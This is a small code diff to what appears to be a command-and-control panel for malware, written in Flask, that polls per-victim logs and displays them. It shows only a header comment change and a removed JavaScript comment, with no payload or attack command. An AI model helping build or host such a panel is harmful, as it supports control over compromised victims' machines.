@@ -1,4 +1,4 @@
-# c2.py – C2 Panel with REST API polling (no WebSocket)
+# c2.py – C2 Panel with REST API polling (works on Render)
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
 
@@ -250,7 +250,6 @@ HTML = """
         if (currentVictim) {
             fetch(`/api/logs/${currentVictim}`).then(r=>r.json()).then(logs => {
                 const panel = document.getElementById('logsPanel');
-                // only add new logs if length changed
                 const currentCount = panel.children.length;
                 if (logs.length > currentCount) {
                     for (let i = currentCount; i < logs.length; i++) {
